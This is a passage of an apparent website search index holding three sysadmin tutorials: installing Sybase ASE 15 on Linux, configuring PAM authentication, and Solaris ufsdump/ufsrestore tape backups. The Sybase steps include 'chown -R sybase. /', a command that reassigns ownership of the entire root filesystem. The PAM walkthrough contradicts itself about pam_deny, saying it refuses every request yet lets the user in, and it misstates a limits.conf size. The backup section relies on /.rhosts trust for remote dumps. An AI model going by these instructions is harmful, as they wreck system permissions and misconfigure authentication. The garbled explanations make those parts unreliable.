                content: "1 Introduction linkAdaptive Server Enterprise is the data management system designed to manage the explosion of data volume in critical contexts.\nAdaptive Server Enterprise (ASE) has long been recognized for its reliability, low total cost of ownership and optimal performance. The latest version ASE 15 focuses on key features that form the foundation for long-term strategic agility and continuous innovation in critical environments. ASE 15 offers unique security options and numerous new features aimed at improving performance while reducing costs and operational risks. Discover how to take advantage of new technologies such as grids and clusters, service-oriented architectures, and real-time messaging.\n2 Installation linkFirst, create a “sybase” user on our system and give it all rights on the partition:\nuseradd sybase chown -R sybase. / Next, we need to know that Linux only shares 32mb by default with Sybase, which needs at least 64mb, so we need to use sysctl to increase the shared memory (to be added to rc.local):\n# rc.local /sbin/sysctl -w kernel.shmmax=67108864 /sbin/sysctl kernel.shmmax (to check) We may need some additional libraries during installation, which can be found using aptitude:\napt-get install libaio-dev libstdc++5-3.3-dev First, download the latest sources: ASE-x.x.x.gz Extract the archive, enter the “sybase” directory and type:\n./setup -console After answering all the installation questions, the installation completes correctly (we hope). However, you need to accept configuring all services (if you did a complete installation) to display all the information. During installation, all server information is displayed, save it somewhere:\nThe installer will now configure the new servers with the following values. Click Next to continue configuring the servers. Adaptive Server Adaptive Server Name DEBSYBASE5 Port number 5012 Page size 2k Error log /opt/sybase/ASE-15_0/install/DEBSYBASE5.log Master device /opt/sybase/data/master.dat Master device size (MB) 30 Master database size (MB) 13 System procedure device /opt/sybase/data/sysprocs.dat System procedure device size (MB) 132 System procedure database size (MB) 132 System Device /opt/sybase/data/sybsysdb.dat System Device Size (MB) 1 System Database Size (MB) 1 Backup Server Backup Server Name DEBSYBASE_BS3 Port number 5013 Error log /opt/sybase/ASE-15_0/install/DEBSYBASE_BS3.log Monitor Server Monitor Server Name DEBSYBASE_MS2 Port number 5014 Error log /opt/sybase/ASE-15_0/install/DEBSYBASE_MS2.log XP Server XP Server Name DEBSYBASE_XP2 Port number 5015 Error log /opt/sybase/ASE-15_0/install/DEBSYBASE_XP2.log Job Scheduler Job Scheduler Agent Name DEBSYBASE5_JSAGENT Port number 4902 Management Device /opt/sybase/data/sybmgmtdb.dat Management Device Size (MB) 75 Management Database Size (MB) 75 Self Management Self Management User Name sa Self Management User Password ****** Web Services HTTP port number for production task 8181 HTTPS port number for production task 8182 Hostname for production task deb-sybase Certificate password ****** Keystore password ****** Log file for production task /opt/sybase/WS-15_0/logs/producer.log Port number for consumption task 8183 Log file for consumption task /opt/sybase/WS-15_0/logs/consumer.log Unified Agent - Self Discovery Service Adaptor Adaptor UDP Unified Agent - Security Login Modules CSI.loginModule.1.provider com.sybase.ua.services.security.simple.SimpleLoginModule CSI.loginModule.1.controlFlag sufficient CSI.loginModule.1.options.moduleName Simple Login Module CSI.loginModule.1.options.username uafadmin CSI.loginModule.1.options.password ****** CSI.loginModule.1.options.roles uaAgentAdmin,uaPluginAdmin CSI.loginModule.1.options.encrypted false CSI.loginModule.2.provider com.sybase.ua.services.security.ase.ASELoginModule CSI.loginModule.2.controlFlag sufficient CSI.loginModule.2.options.moduleName ASE Login Module 2.1 Environment Variables linkHere are the SYBASE variables that need to be exported:\nexport JAVA_JRE=/opt/sybase/_jvm/ export SYBASE_OCS=OCS-15_0 export SYBASE=/opt/sybase export JAVA_HOME=/opt/sybase/_jvm/ export SYBASE_JRE=/opt/sybase/shared/jre142_013/ export SYBASE_WS=WS-15_0 export LANG=fr export PATH=$PATH:/etc/init.d/ export SYBASE_ASE=ASE-15_0/ export PATH=$PATH:/opt/sybase/ASE-15_0/install/ export PATH=$PATH:/opt/sybase/OCS-15_0/bin/ 3 Administration link3.1 Starting the Server linkIf you have declared all the variables above:\nstartserver -f RUN_DEBSYBASE (according to our server name) Otherwise, navigate to the Sybase directory and run the startup script:\ncd /opt/sybase/ASE-15.0/install ./startserver -f RUN_DEBSYBASE 3.2 Stopping the Server linkTo properly shut it down, use isql:\nisql -Usa -P(sa password) -S(sybase server name) (or navigate to the directory where isql is located) 1\u003eshutdown 2\u003ego 3.3 Server Status linkIf you have declared all the variables above, you can check if the server is running (similar to ps -aux | grep SYBASE), otherwise find where the showserver file is located:\nshowserver 3.4 Creating a User, Device, and Database linkEverything is done in isql:\n1\u003esp_addlogin 'username', 'password' 2\u003ego To create a device, which is a file that will contain a database:\n-- file in /data/sybase/data01.dat of 100mb 1\u003edisk init name='data01', physname='/data/sybase/data01.dat', size='100m' 2\u003ego To create a database on this file:\nCREATE DATABASE ON = 3.5 Changing a Password linkIn isql using the account whose password is to be changed:\n1\u003e exec sp_password NULL, \"Secr3t\" (old_password, new_password)(here we set a password in place of an non-existent password) 2\u003e go Password correctly set. (return status = 0) 4 FAQ linkERROR:\n00:00000:00000:2008/03/06 16:02:18.10 kernel kbcreate: couldn't create kernel region. 00:00000:00000:2008/03/06 16:02:18.10 kernel kistartup: could not create shared memory This means the shared memory is not large enough.\nSOLUTION:\n/sbin/sysctl -w kernel.shmmax=67108864 5 Links linkSybase website: http://www.sybase.fr/ All documentation: http://infocenter.sybase.com/help/index.jsp?topic=/com.sybase.help.ase_15.0.sag1/html/sag1/sag11.htm A tutorial to manage your server with the Windows client: http://www.ianywhere.com/developer/product_manuals/sqlanywhere/0901/fr/html/dbfgfr9/00000165.htm\n"
            }
        );
    index.add(
            {
                id:  663 ,
                href: "\/PAM_%28Pluggable_Authentification_Module%29_:_Choisir_ses_m%C3%A9thodes_d%27authentifications\/",
                title: "PAM (Pluggable Authentication Module): Choosing Authentication Methods",
                description: "A comprehensive guide to PAM (Pluggable Authentication Module) configuration on Linux systems, explaining how to customize authentication methods for various services.",
                content: "Introduction linkPAM is THE standard authentication system used in Linux. The power of this tool is unlimited, but it’s not always well documented which tends to work against it. As an introduction, let’s first look at the motivations that led to the creation of PAM. Originally, in Unix (and in early versions of Linux), the file that centralized user management was /etc/passwd. It contained many sensitive pieces of information, including encrypted passwords. To use a Unix machine, the first thing to do was to authenticate via the login program (the last program launched by init). This program was developed to parse the /etc/passwd file.\nHowever, over time, it was realized that storing user passwords in a file readable by everyone could represent a security hole (as personal machines became increasingly capable of brute-forcing passwords). This realization led to the creation of a separate password file called /etc/shadow.\nHowever, login had to be reimplemented to take this change into account. The same was true for all programs requiring authentication (ftp, su, sudo…).\nLater, it became apparent that having a flat file for authentication could be limiting when handling tens of thousands of accounts. Other databases were therefore used, such as directories. The idea was revolutionary, but the problem was that, once again, certain parts of the authentication code for the concerned applications had to be rewritten.\nAfter these observations (a few hours of software engineering and hundreds of thousands of lines of code later), Linux kernel developers had the idea to move the entire authentication layer outside the programs that needed it. They therefore created the Pluggable Authentication Modules.\nMode of Operation linkLinux PAM is a set of dynamic libraries managing specific points of the authentication process. As we will see below, when we talk about authentication, we are not limited to the simple login/password challenge, but rather to a set of authorization points that can affect both authentication itself and sessions or password management.\nAn application can be developed to dynamically link to these libraries and thus access already implemented and stable functionalities. As such, Linux PAM provides developers with a detailed API of available functions.\nFor information, these libraries are generally found in the /lib/security directory.\nFrom the system administrator’s perspective, this allows configuring the behavior to adopt for all applications requiring authentication. The only restriction is that the application must be “PAM enabled”, meaning it was developed to use PAM libraries. Refer to the application documentation in case of doubt.\nThe administrator can therefore, if desired, define that for a given service (for example xdm), authentication will be done in 3 distinct steps (materialized by the use of 3 dynamic libraries, therefore 3 modules) to which configuration arguments will be passed.\nOne can therefore choose exactly their own authentication policy for this application, independently of the application itself.\nIn PAM terminology, configuring an application amounts to configuring access to the service. Thus, if you install proftpd or wuftpd, you will provide the ftp service to your users.\nAll services are configured in the /etc/pam.d/ directory where each file details the authentication policies related to that service.\nHierarchical Organization of Authentication Tasks linkTo simplify the use and understanding of the role of each module, authentication tasks are divided into 4 independent groups:\nAccount Authentication Password Session A service is therefore divided into 4 groups. One or more modules are assigned to each group.\nAlthough in theory these groups seem to clearly delineate each task of the authentication process, the reader should keep in mind that for some modules, distinguishing the placement of the module among these 4 groups is not always easy, especially since a module can intervene in several groups. To know precisely the possibilities offered by a module for each group, one must read the documentation of the developer of the module in question. Generally, the synopsis of a module’s usage is provided in its man page.\nTo summarize:\nA module is a piece of code capable of being dynamically linked to an application providing a service. A service is configured in a file (named according to its service type) contained in the /etc/pam.d/ directory. A module offers a certain number of functionalities that are organized into 4 groups, defining their scope of action. A module can provide functionalities for one or more groups. For example, the pam_xauth module only provides functionalities in the session group whereas pam_unix provides them for each group. Example of Linux PAM Usage linkThe first idea that generally comes to an administrator’s mind regarding security is to define who can physically access a machine. For this, we will configure 2 accesses:\nlogin which is used to connect in console mode gdm which is used to connect in graphical mode with the Gnome environment (the reader will use their own session manager, according to the work environment) These applications being “PAM enabled”, we can freely define the security policy we desire.\n[seb@localhost seb]$ cat /etc/pam.d/login #%PAM-1.0 : login service auth required pam_nologin.so auth required pam_access.so #auth required pam_securetty.so auth required pam_stack.so service=system-auth account required pam_stack.so service=system-auth password required pam_stack.so service=system-auth session required pam_stack.so service=system-auth session optional pam_console.so As we mentioned earlier, each service (defined by the file name) uses modules (3rd column), distributed into groups (1st column). Similarly, some modules can be used multiple times, in different groups, their behavior being different.\nIn the examples provided above, we can see the use of the pam_stack module in almost all authentication groups. This module is a bit special since its only objective is to refer authentication to the module passed as an argument. It thus allows defining a common behavior for many services, ideal for simple or homogeneous configurations.\nIf you modify the configuration of the system-auth module, all other modules that use it through pam_stack will be modified.\nAnother important point in the configuration of service files concerns the stacking of modules in the order of reading. Thus, in the example above, in the authentication group, the pam_nologin module will be evaluated before the pam_access module, itself evaluated before pam_stack. This is important when one considers that one can define what the consequence of the successful use of a module will be.\nWe have the possibility to define 4 types of success obligations to hold:\nrequired requisite sufficient optional If we synthesize all the concepts we have just discussed, the configuration of a security policy that applies to a service involves the use of one or more modules, informed in a file located in /etc/pam.d. In this file, each line informs PAM to use a functionality of a module according to the group, written at the beginning of the line (auth, session…).\nPAM will sequentially read the lines of each group and will confront the success obligation defined by the administrator (required, requisite…) with the return code sent back by the library and decide whether to continue or not, according to the result.\nIt is important to identify what gives rise to an interaction with the user, for example a module of the type pam_unix.so, and what only applies a treatment (pam_env) to set the control flag.\nLet’s take a simple example. Imagine that we want to define the following scenario for authentication with gdm:\nThe user must have a local account on the machine Their password must not be null We wish to define environment variables for them The user must have the right to log in We are therefore only interested in the authentication part, each line that we will fill in will therefore be preceded by “auth”:\nauth required pam_env.so // Define the use of user environment variables auth required pam_unix.so // Use the standard Linux authentication procedure auth required pam_nologin.so // The user must be among the users with login rights auth required pam_deny.so When Boulay wants to log in to the machine, PAM will check the following points: The first entry in the stack concerns the pam_env module. This defines environment variables specified in the /etc/environment file. A priori, no error can be generated at this stage, stack reading continues.\nThe pam_unix module will handle Unix-style authentication, that is, it will read /etc/passwd and /etc/shadow to validate the login/password challenge. In addition, we provide the argument that a null password is not acceptable. If Boulay succeeds in proving who he really is by this mechanism, PAM will continue reading the stack.\nThe last module used for authentication is pam_deny which will systematically refuse the connection request. As with pam_env, the result will always be valid. The total result of the stack is valid, so the user can access the service. Login will fork and execute a shell for them, giving them access to the machine.\nExample of Advanced Configuration linkAfter seeing how to organize the configuration of PAM’s behavior for a simple service, we will now detail some configuration examples to significantly increase the security of certain programs.\nBy default, distributions accept that any user can request access to a super user session by invoking the su command. To only accept users who are members of the wheel group, add the following line in the su service (/etc/pam.d/su):\nauth required pam_wheel.so use_uid And since PAM is modular, it will be the same for each service. You can therefore define that for such a service, only users who are members of the wheel group will be able to authenticate.\nWith the above example, it’s easy to understand that it is now very simple to apply execution rights according to a given service and user.\nOne of the recurring problems under Unix is the use of certain minimalist C programs that can cause the machine to malfunction. Thus, as is often the case in scientific schools or universities, students may use the famous fork Bomb (while(1) fork() ), leading the machine into a deluge of process creation, no longer allowing it to respond to legitimate actions.\nFortunately, the pam_limits.so module allows limiting the resources used by users. This module, once defined in the service one wishes to use, must be configured by editing the /etc/security/limits.conf file.\nThis module works in the session group, so we edit /etc/pam.d/{gdm,kdm,login} according to the manager used:\nsession required /lib/security/pam_limits.so // Without arguments, uses the file /etc/security/limits.conf Then, by editing the limits.conf file:\n# boulay hard fsize 100000 // Defines a maximum disk usage size for the user boulay @etudiant hard nproc 30 // Defines a maximum number of ongoing processes for the student user group Thus, during each session the user boulay will not be able to create a file with a size greater than 10MB and students will not be able to launch more than 30 processes. However, be careful with the limits you wish to define, knowing that with environments such as KDE or Gnome, many background processes are executed…\nConclusion linkDue to its power, PAM may seem quite complex to use at first, especially since an error can quickly prevent you from accessing your machine (only a reboot in single user mode can help you in this case). Nevertheless, the large number of official and unofficial modules allow making authentication tasks under Linux very versatile. You can easily integrate authentication through LDAP, NDS, or with an NT server or even by biometrics without modifying the code of the services.\n"
            }
        );
    index.add(
            {
                id:  664 ,
                href: "\/Sauvegardes_et_Restaurations\/",
                title: "Backups and Restorations with tapes",
                description: "A comprehensive guide to backup and restoration techniques, covering tape backups, incremental backups, and UFS snapshots",
                content: "Introduction linkA crucial function of system administration is to backup file systems. Backups safeguard against data loss, damage, or corruption. Backup tapes are often referred to as dump tapes.\nrmt device linkAll tape drives have logical device names that you use to reference the device on the command line. The image shows the format that all logical device names use.\n/dev/rmt/#hn # : Logical Tape number h : Tape density (l,m,h,c,u) No rewind The logical tape numbers in the tape drive names always start with 0. For example:\nThe first instance of a tape drive: /dev/rmt/0 The second instance of a tape drive: /dev/rmt/1 The third instance of a tape drive: /dev/rmt/2 Two optional parameters further define the logical device name:\nTape density - Five values can be given in the tape device name: l (low), m (medium), h (high), c (compressed), or u (ultra compressed). No rewind - The letter n at the end of a tape device name indicates that the tape should not be rewound when the current operation completes. Tape densities depend on the tape drive. Check the manufacturer’s documentation to determine the correct densities for the tape media.\nTape drives that support data compression contain internal hardware that performs the compression. If you back up a software-compressed file to a tape drive with hardware compression, the resulting file may be larger in size.\nmt linkYou use the mt command (magnetic tape control) to send instructions to the tape drive. Not all tape drives support all mt commands.\nThe format for the mt command is:\nmt -f tape-device-name command count You use the -f option to specify the tape device name, typically a no-rewind device name. If no -f option is used, the default tape device file /dev/rmt/0 is used.\nUsing the mt Command linkThe table lists some of the mt commands that you can use to control a magnetic tape drive.\nCommand Definition mt status Displays status information about the tape drive mt rewind Rewinds the tape mt offline Rewinds the tape and, if appropriate, takes the drive unit offline and if the hardware supports it, unloads mt fsf count Moves the tape forward count records Assuming the tape was rewound to the start of tape, the following command positions the tape at the beginning of the third tape record.\nmt -f /dev/rmt/0n fsf 2 The most common method to schedule backups is to perform cumulative incremental backups daily. This schedule is recommended for most situations.\nTo set up a backup schedule, determine:\nThe file systems to back up A backup device (for example, tape drive) The number of tapes to use for the backup The type of backup (for example, full or incremental) The procedures for marking and storing tapes The time it takes to perform a backup Determining File System Names to Back Up\nDisplay the contents of the /etc/vfstab file. Then view the mount point column to find the name of the file system that you want to back up. Determining the Number of Tapes\nYou determine the number of tapes for a backup according to the size of the file system you are backing up.\nTo determine the size of the file system, use the ufsdump command with the S option. The following are the command formats:\n# ufsdump 0S filesystem_name or\n# ufsdump 3S filesystem_name The numeric option determines the appropriate dump level. The output is the estimated number of bytes that the system requires for a complete backup.\nDivide the reported bytes by the capacity of the tape to determine how many tapes you need to backup the file system. Determining Back Up Frequency and Levels\nYou determine how often and at what level to backup each file system. The level of a backup refers to the amount of information that is backed up.\nIdentifying Incremental and Full Backups linkYou can perform a full backup or an incremental backup of a file system. A full backup is a complete file system backup. An incremental backup copies only files in the file system that have been added or modified since a previous lower-level backup.\nYou use dump level 0 to perform a full backup. You use dump levels 1 through 9 to schedule incremental backups. The level numbers have no meaning other than their relationship to each other as a higher or lower number.\nThe Explore shows an example of a file system backup performed in incremental levels.\nThe table defines the elements of the sample incremental backup strategy shown in The image.\nLevel Example 0 (Full) Performed once each month. 3 Performed every Monday. The backup copies new or modified files since the last lower-level backup (for example, 0). 4 Performed every Tuesday. The backup copies new or modified files since the last lower-level backup (for example, 3). 5 Performed every Wednesday. The backup copies new or modified files since the last lower-level backup (for example, 4). 6 Performed every Thursday. The backup copies new or modified files since the last lower-level backup (for example, 5). 2 Performed every Friday. The backup copies new or modified files since the last lower-level backup, which is the Level 0 backup at the beginning of the month. Note: Many system administrators use the crontab utility to start a script that runs the ufsdump command.\nThe /etc/dumpdates file records backups if the -u option is used with the ufsdump command. Each line in the /etc/dumpdates file shows the file system that was backed up and the level of the last backup. It also shows the day, the date, and the time of the backup.\nThe following is an example /etc/dumpdates file:\n# cat /etc/dumpdates /dev/rdsk/c0t2d0s6 0 Fri Nov 5 19:12:27 2004 /dev/rdsk/c0t2d0s0 0 Fri Nov 5 20:44:02 2004 /dev/rdsk/c0t0d0s7 0 Tue Nov 9 09:58:26 2004 /dev/rdsk/c0t0d0s7 1 Tue Nov 9 16:25:28 2004 When an incremental backup is performed, the ufsdump command consults the /etc/dumpdates file. It looks for the date of the next lower-level backup. Then, the ufsdump command copies to the backup media all of the files that were modified or added since the date of that lower-level backup.\nWhen the backup is complete, the /etc/dumpdates file records a new entry that describes this backup. The new entry replaces the entry for the previous backup at that level.\nYou can view the /etc/dumpdates file to determine if the system is completing backups. If a backup does not complete because of equipment failure, the /etc/dumpdates file does not record the backup.\nNote: When you are restoring an entire file system, check the /etc/dumpdates file for a list of the most recent dates and levels of backups. Use this list to determine which tapes are needed to restore the entire file system. The tapes should be physically marked with the dump level and date of the backup.\nCheck that the file system is inactive, or unmounted, before you back the system up. If the file system is active, the output of the backup can be inconsistent, and you could find it impossible to restore some of the files correctly.\nBacking Up an Unmounted File System linkThe standard Solaris OS command for ufs file system backups is /usr/sbin/ufsdump.\nThe format for the ufsdump command is:\nufsdump option(s) argument(s) filesystem_name You can use this command to back up a complete or a partial file system. Backups are often referred to as dumps.\nThe table defines several common options for the ufsdump command.\nOption Description 0-9 Back up level. Level 0 is a full backup of the file system. Levels 1 through 9 are incremental backups of files that have changed since the last lower-level backup. When no backup level is given, the default is level 9. v Verify. After each tape is written, the system verifies the contents of the media against the source file system. If any discrepancies occur, the system prompts the operator to insert new media and repeat the process. Use this option only on an unmounted file system. Any activity in the file system causes the system to report discrepancies. S Size estimate. This option allows you to estimate the amount of space that will be needed on the tape to perform the level of backup you want. l Autoload. You use this option with an autoloading (stackloader) tape drive. o Offline. When the backup is complete, the system takes the drive offline, rewinds the tape (if you use a tape), and, if possible, ejects the media. u Update. The system creates an entry in the /etc/dumpdates file with the device name for the file system disk slice, the backup level (0-9), and the date. If an entry already exists for a backup at the same level, the system replaces the entry. n Notify. The system sends messages to the terminals of all logged-in users who are members of the sys group to indicate that the ufsdump command requires attention. f device Specify. The system specifies the device name of the file system backup. When you use the default tape device, /dev/rmt/0, you do not need the -f option. The system assumes the default. You use the ufsdump command to create file system backups to tape. The dump level (0-9) specified in the ufsdump command determines which files to back up.\nUsing the ufsdump Command linkPerform the following steps to use the ufsdump command to start a tape backup:\nBecome the root user to change the system to single-user mode, and unmount the file systems. # /usr/sbin/shutdown -y -g300 \"System is being shutdown for backup\" Shutdown started. Mon Oct 11 12:22:33 BST 2004 Broadcast Message from root (pts/1) on host1 Mon Oct 11 12:22:33... The system host1 will be shut down in 5 minutes System is being shutdown for backup (further output omitted) Verify that the /export/home file system was unmounted with the shutdown command. If not, unmount it manually. Check the integrity of the file system data with the fsck command. # fsck /export/home Perform a full (Level 0) backup of the /export/home file system. # ufsdump 0uf /dev/rmt/0 /export/home # ufsdump 0uf /dev/rmt/0 /export/home DUMP: Writing 32 Kilobyte records DUMP: Date of this level 0 dump: Mon Oct 11 12:30:44 2004 DUMP: Date of last level 0 dump: the epoch DUMP: Dumping /dev/rdsk/c0t0d0s7 (host1:/export/home) to /dev/rmt/0. DUMP: Mapping (Pass I) [regular files] DUMP: Mapping (Pass II) [directories] DUMP: Estimated 1126 blocks (563KB). DUMP: Dumping (Pass III) [directories] DUMP: Dumping (Pass IV) [regular files] DUMP: Tape rewinding DUMP: 1086 blocks (543KB) on 1 volume at 1803 KB/sec DUMP: DUMP IS DONE DUMP: Level 0 dump on Mon Oct 11 12:42:12 2004 You can use the ufsdump command to perform a backup on a remote tape device.\nThe format for the ufsdump command is:\nufsdump options remotehost:tapedevice filesystem To perform remote backups across the network, the system with the tape drive must have an entry in its /.rhosts file for every system that uses the tape drive. Using the ufsdump Command\nThe following example shows how to perform a full (Level 0) backup of the /export/home file system on the host1 system, to the remote tape device on the host2 system.\n# ufsdump 0uf host2:/dev/rmt/0 /export/home DUMP: Writing 32 Kilobyte records DUMP: Date of this level 0 dump: Mon Oct 11 13:30:44 2004 DUMP: Date of last level 0 dump: the epoch DUMP: Dumping /dev/rdsk/c0t0d0s7 (host1:/export/home) to host2:/dev/rmt/0. DUMP: Mapping (Pass I) [regular files] DUMP: Mapping (Pass II) [directories] DUMP: Estimated 320 blocks (160KB). DUMP: Dumping (Pass III) [directories] DUMP: Dumping (Pass IV) [regular files] DUMP: Tape rewinding DUMP: 318 blocks (159KB) on 1 volume at 691 KB/sec DUMP: DUMP IS DONE DUMP: Level 0 dump on Mon Oct 11 13:44:12 2004 Restoring linkWhen you are restoring data to a system, consider the following questions:\nCan the system boot on its own (regular file system restore)? Do you need to boot the system from CD-ROM, DVD, or network (critical file system restore)? Do you need to boot the system from CD-ROM, DVD, or network and repair the boot drive (special case recovery)? To restore files or file systems, determine the following:\nThe file system backup tapes that are needed The device name to which you will restore the file system The name of the temporary directory to which you will restore individual files The type of backup device to be used (local or remote) The backup device name (local or remote) To restore a regular file system, such as the /export/home or /opt file system, back up to the disk, you use the ufsrestore command. The ufsrestore command copies files to the disk, relative to the current working directory, from backup tapes that were created by the ufsdump command.\nYou can use the ufsrestore command to reload an entire file system hierarchy from a Level 0 backup and related incremental backups. You can also restore one or more single files from any backup tape.\nThe format for the ufsrestore command is:\nufsrestore option(s) argument(s) filesystem The table describes some options that you can use with the ufsrestore command.\nOption Description t Lists the table of contents of the backup media. r Restores the entire file system from the backup media. x file1 file2 Restores only the files named on the command line. i Invokes an interactive restore. v Specifies verbose mode. This mode displays the path names to the terminal screen as each file is restored. f device Specifies the tape device name. When not specified, the /dev/rmt/0 device file is used. When you restore an entire file system from a backup tape, the system creates a restoresymtable file. The ufsrestore command uses the restoresymtable file for check-pointing or passing information between incremental restores. You can remove the restoresymtable file when the restore is complete.\nufsrestore linkThe following procedure demonstrates how to use the ufsrestore command to restore the /opt file system on the c0t0d0s5 slice.\nCreate the new file system structure. newfs /dev/rdsk/c0t0d0s5 Mount the file system to the /opt directory, and change to that directory. mount /dev/dsk/c0t0d0s5 /opt cd /opt Restore the entire /opt file system from the backup tape. ufsrestore rf /dev/rmt/0 Note: Always restore a file system by starting with the Level 0 backup tape, continuing with the next-lower-level tape, and continuing through the highest-level tape.\nRemove the restoresymtable file. rm restoresymtable Unmount the new file system. cd / umount /opt Use the fsck command to check the restored file system. fsck /dev/rdsk/c0t0d0s5 Perform a full backup of the file system. ufsdump 0uf /dev/rmt/0 /dev/rdsk/c0t0d0s5 Note: The system administrator should always back up the newly created file system because the ufsrestore command repositions the files and changes the inode allocation.\ninit 6 The ufsrestore i command invokes an interactive interface. Through the interface, you can browse the directory hierarchy of the backup tape and select individual files to extract. The term volume is used by ufsrestore and should be considered a single tape. Using the ufsrestore i Command\nThe following procedure demonstrates how to use the ufsrestore i command to extract individual files from a backup tape.\nBecome the root user, and change to the temporary directory that you want to receive the extracted files. cd /export/home/tmp Perform the ufsrestore i command. $ ufsrestore ivf /dev/rmt/0 Verify volume and initialize maps Media block size is 64 Dump date: Mon Oct 11 12:30:44 2004 Dumped from: the epoch Level 0 dump of /export/home on sys43:/dev/dsk/c0t0d0s7 Label: none Extract directories from tape Initialize symbol table. Display the contents of the directory structure on the backup tape. $ ufsrestore \u003e ls .: 2 *./ 13 directory1 15 directory3 11 file2 2 *../ 14 directory2 10 file1 12 file3 Change to the target directory on the backup tape. $ ufsrestore \u003e cd directory1 $ ufsrestore \u003e ls ./directory1: 3904 ./ 2 *../ 3905 file1 3906 file2 3907 file3 Add the files you want to restore to the extraction list. $ ufsrestore \u003e add file1 file2 $ Make node ./directory1 Files you want to restore are marked with an asterisk (*) for extraction. If you extract a directory, all of the directory contents are marked for extraction.\nIn this example, two files are marked for extraction. The ls command displays an asterisk in front of the selected file names, file1 and file2.\n$ ufsrestore \u003e ls ./directory1: 3904 *./ 2 *../ 3905 *file1 3906 *file2 3907 file3 To delete a file from the extraction list, use the delete command. ufsrestore \u003e delete file1 The ls command displays the file1 file without an asterisk.\n$ ufsrestore \u003e ls ./directory1: 3904 *./ 2 *../ 3905 file1 3906 *file2 3907 file3 To view the files and directories marked for extraction, use the marked command. $ ufsrestore \u003e marked ./directory1: 3904 *./ 2 *../ 3906 *file2 To restore the selected files from the backup tape, perform the command: $ ufsrestore \u003e\u003e extract Extract requested files You have not read any volumes yet. Unless you know which volume your file(s) are on you should start with the last volume and work towards the first. Specify next volume #: 1 Note: The ufsrestore command has to find the selected files. If you used more than one tape for the backup, first insert the tape with the highest volume number and type the appropriate number at this point. Then repeat, working towards Volume #1 until all files have been restored.\nextract file ./directory1/file2 Add links Set directory mode, owner, and times. set owner/mode for .\"? [yn] n Note: Answering y sets ownership and permissions of the temporary directory to those of the mount point on the tape.\nTo exit the interactive restore after the files are extracted, perform the command: ufsrestore\u003e quit Move the restored files to their original or permanent directory location, and delete the files from the temporary directory. mv /export/home/tmp/directory1/file2 /export/home rm -r /export/home/tmp/directory1 Note: You can use the help command in an interactive restore to display a list of available commands.\nRestoring a ufs File System linkWhen performing incremental restores, start with the last volume and work towards the first. The system uses information in the restoresymtable file to restore incremental backups on top of the latest full backup.\nThe following procedure demonstrates how to restore the /export/home file system from incremental tapes.\nNote: This procedure makes use of the interactive restore to assist in showing the concept of incremental restores. You would typically use a command, such as ufsrestore rf, for restoring entire file systems.\nView the contents of the /etc/dumpdates file for information about the /export/home file system. # more /etc/dumpdates |grep c0t0d0s7 /dev/rdsk/c0t0d0s7 0 Wed Apr 07 09:55:34 2004 /dev/rdsk/c0t0d0s7 1 Web Apr 07 09:57:30 2004 Create the new file system structure for the /export/home file system. newfs /dev/rdsk/c0t0d0s7 Mount the file system and change to that directory. mount /dev/dsk/c0t0d0s7 /export/home cd /export/home Insert the Level 0 backup tape. Restore the /export/home file system from the backup tapes. # ufsrestore rvf /dev/rmt/0 Verify volume and initialize maps Media block size is 64 Dump date: Wed Apr 07 09:55:34 2004 Dumped from: the epoch Level 0 dump of /export/home on sys41:/dev/dsk/c0t0d0s7 Label: none Begin level 0 restore Initialize symbol table. Extract directories from tape Calculate extraction list. Make node ./directory1 Make node ./directory2 Make node ./directory3 Extract new leaves. Check pointing the restore extract file ./file1 extract file ./file2 extract file ./file3 Add links Set directory mode, owner, and times. Check the symbol table. Check pointing the restore Load the next lower-level tape into the tape drive: # ufsrestore rvf /dev/rmt/0 Verify volume and initialize maps Media block size is 64 Dump date: Wed Apr 07 09:57:30 2004 Dumped from: Wed Apr 07 09:55:34 2004 Level 1 dump of /export/home on sys41:/dev/dsk/c0t0d0s7 Label: none Begin incremental restore Initialize symbol table. Extract directories from tape Mark entries to be removed. Calculate node updates. Make node ./directory4 Make node ./directory5 Make node ./directory6 Find unreferenced names. Remove old nodes (directories). Extract new leaves. Check pointing the restore extract file ./file4 extract file ./file5 extract file ./file6 Add links Set directory mode, owner, and times. Check the symbol table. Check pointing the restore Alternative Steps linkThe following steps are an alternative to the previous Steps 5 and 6.\nRestore the /export/home file system from the backup tapes. (This example uses an interactive, verbose restore to provide more detailed information.) # ufsrestore ivf /dev/rmt/0 Verify volume and initialize maps Media block size is 64 Dump date: Mon Oct 11 13:10:12 2004 Dumped from: the epoch Level 0 dump of /export/home on sys41:/dev/dsk/c0t0d0s7 Label: none Extract directories from tape Initialize symbol table. $ ufsrestore \u003e ls .: 2 *./ 8 directory2 5 file2 2 *../ 9 directory3 6 file3 7 directory1 4 file1 3 lost+found/ The system lists files from the last Level 0 backup. $ ufsrestore \u003e add * Warning: ./lost+found: File exists $ ufsrestore \u003e extract Extract requested files You have not read any volumes yet. Unless you know which volume your file(s) are on you should start with the last volume and work towards the first. Specify next volume #: 1 extract file ./file1 extract file ./file2 extract file ./file3 extract file ./directory1 extract file ./directory2 extract file ./directory3 Add links Set directory mode, owner, and times. set owner/mode for '.'? [yn] n Directories already exist, set modes anyway? [yn] n ufsrestore \u003e q The information in the /etc/dumpdates file shows an incremental backup that was taken after the Level 0 backup. Load the next tape and perform the incremental restore. $ ufsrestore iv Verify volume and initialize maps Media block size is 64 Dump date: Wed Apr 07 09:57:30 2004 Dumped from: Wed Apr 07 09:55:34 2004 Level 1 dump of /export/home on sys41:/dev/dsk/c0t0d0s7 Label: none Extract directories from tape Initialize symbol table. $ ufsrestore \u003e ls .: 2 *./ 13 directory4 15 directory6 11 file5 2 *../ 14 directory5 10 file4 12 file6 $ ufsrestore \u003e add * $ ufsrestore \u003e extract Extract requested files You have not read any volumes yet. Unless you know which volume your file(s) are on you should start with the last volume and work towards the first. Specify next volume #: 1 extract file ./file4 extract file ./file5 extract file ./file6 extract file ./directory4 extract file ./directory5 extract file ./directory6 Add links Set directory mode, owner, and times. set owner/mode for '.'? [yn] n $ ufsrestore \u003e q Creating a UFS Snapshot linkThe UFS Copy on Write Snapshots feature provides administrators an online backup solution for ufs file systems. This utility enables you to use a point-in-time copy of a ufs file system, called a snapshot, to create an online backup. You can create the backup while the file system is mounted and the system is in multiuser mode.\nNote: The UFS snapshots are similar to the Sun StorEdge Instant Image product. Instant Image allocates space equal to the size of the entire file system that is being captured. However, the file system data saved by UFS snapshots occupies only as much disk space as needed.\nYou use the fssnap command to create, query, or delete temporary read-only snapshots of ufs file systems.\nThe format for the fssnap command is:\n/usr/sbin/fssnap -F FSType -V -o special_option(s) mount-point The table shows some of the options for the fssnap command.\nOption Description -d Deletes the snapshot associated with the given file system. If the -o 